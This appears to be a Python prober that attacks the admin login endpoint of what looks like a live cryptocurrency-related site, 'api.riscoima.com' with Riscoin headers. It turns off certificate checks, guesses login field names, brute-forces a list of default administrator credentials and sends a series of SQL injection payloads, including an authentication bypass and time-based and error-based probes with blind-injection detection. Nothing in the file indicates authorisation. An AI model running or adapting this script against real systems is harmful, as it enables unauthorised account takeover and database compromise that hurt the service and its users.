"""
Riscoin Admin Login Endpoint Prober
Tests various field name combinations and payloads against /api/admin/login
"""

import json
import requests
import urllib3
urllib3.disable_warnings()

BASE_URL = "https://api.riscoima.com"
HEADERS = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

def test_admin_login(payload, label=""):
    try:
        r = requests.post(f"{BASE_URL}/api/admin/login", json=payload, headers=HEADERS, timeout=10, verify=False)
        print(f"  [{r.status_code}] {label}: {r.text[:200]}")
        return r.json() if r.status_code == 200 else None
    except Exception as e:
        print(f"  [ERR] {label}: {e}")
        return None

print("=" * 70)
print("PHASE 1: Field Name Discovery")
print("=" * 70)

# Test systematically - one field at a time to see which is "missing"
single_fields = [
    {"userName": "admin"},
    {"username": "admin"},
    {"email": "admin"},
    {"account": "admin"},
    {"loginName": "admin"},
    {"name": "admin"},
    {"phone": "admin"},
    {"mobile": "admin"},
    {"password": "admin123"},
    {"passWord": "admin123"},
    {"pwd": "admin123"},
    {"code": "1234"},
    {"googleCode": "123456"},
    {"verifyCode": "1234"},
    {"captcha": "1234"},
    {"imageCode": "1234"},
]

for payload in single_fields:
    key = list(payload.keys())[0]
    test_admin_login(payload, f"Single: {key}")

print("\n" + "=" * 70)
print("PHASE 2: Common Combinations")
print("=" * 70)

combos = [
    ({"userName": "admin", "password": "admin123"}, "userName+password"),
    ({"userName": "admin", "passWord": "admin123"}, "userName+passWord"),
    ({"userName": "admin", "password": "admin123", "code": "1234"}, "userName+password+code"),
    ({"userName": "admin", "password": "admin123", "googleCode": "123456"}, "userName+password+googleCode"),
    ({"userName": "admin", "password": "admin123", "imageCode": "1234"}, "userName+password+imageCode"),
    ({"userName": "admin", "password": "admin123", "captcha": "1234"}, "userName+password+captcha"),
    ({"userName": "admin", "password": "admin123", "verifyCode": "1234"}, "userName+password+verifyCode"),
    ({"email": "admin", "password": "admin123"}, "email+password"),
    ({"email": "admin@riscoin.com", "password": "admin123"}, "email(full)+password"),
    ({"account": "admin", "password": "admin123"}, "account+password"),
    ({"loginName": "admin", "loginPwd": "admin123"}, "loginName+loginPwd"),
    ({"mobile": "admin", "password": "admin123"}, "mobile+password"),
    ({"userName": "admin", "password": "admin123", "code": "1234", "googleCode": "123456"}, "all_fields"),
]

for payload, label in combos:
    test_admin_login(payload, label)

print("\n" + "=" * 70)
print("PHASE 3: Credential Testing (if userName+password works)")
print("=" * 70)

creds = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "Admin@123"),
    ("admin", "Riscoin@2026"),
    ("admin", "riscoin2024"),
    ("root", "root"),
    ("root", "123456"),
    ("system", "system"),
    ("superadmin", "admin123"),
    ("test", "test"),
    ("demo", "demo"),
    ("riscoin", "riscoin"),
    ("operator", "operator123"),
]

for user, pwd in creds:
    test_admin_login({"userName": user, "password": pwd}, f"{user}/{pwd}")

print("\n" + "=" * 70)
print("PHASE 4: SQL Injection (careful of WAF)")
print("=" * 70)

sqli_payloads = [
    ({"userName": "admin'", "password": "test"}, "Single quote"),
    ({"userName": "admin\"", "password": "test"}, "Double quote"),
    ({"userName": "admin\\", "password": "test"}, "Backslash"),
    ({"userName": "admin' AND '1'='1", "password": "test"}, "AND true"),
    ({"userName": "admin' AND '1'='2", "password": "test"}, "AND false"),
    ({"userName": "' OR 1=1 LIMIT 1-- ", "password": "test"}, "OR bypass"),
    ({"userName": "admin' WAITFOR DELAY '0:0:5'--", "password": "test"}, "Time-based MSSQL"),
    ({"userName": "admin' AND SLEEP(5)#", "password": "test"}, "Time-based MySQL"),
    ({"userName": "admin' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)-- ", "password": "test"}, "Error-based"),
    ({"userName": "admin", "password": "' OR '1'='1"}, "Password SQLi"),
]

import time
for payload, label in sqli_payloads:
    start = time.time()
    test_admin_login(payload, f"SQLi-{label}")
    elapsed = time.time() - start
    if elapsed > 4:
        print(f"  *** DELAY DETECTED: {elapsed:.1f}s — possible blind SQLi! ***")

print("\nDone.")
